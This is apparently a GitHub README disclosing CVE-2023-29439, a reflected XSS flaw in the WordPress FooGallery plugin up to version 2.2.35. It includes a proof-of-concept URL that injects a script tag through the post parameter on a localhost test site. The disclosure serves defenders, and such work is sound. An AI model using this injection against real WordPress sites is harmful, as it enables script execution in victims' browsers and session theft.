# CVE-2023-29439

This repository is about XSS vulnerability in Wordpress Foogallery Plugin.

## Vulenerability details

### Description
In Foogallery 2.2.35 and earlier, the function `foogallery_image_editor_modal` in `foogallery/includes/admin/class-gallery-attachment-modal.php` is vulnerable to XSS attack.

### Pre-requisite
- Unauthenticated

### Proof-of-Concept
1. Foogallery Settings → Admin → Enable Advanced Attachment Modal 
2. Send `http://localhost:8080/wp-admin/post-new.php?post_type=foogallery&post=”><script>alert(1)</script>`

## References

[CVE-2023-29439](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-29439)
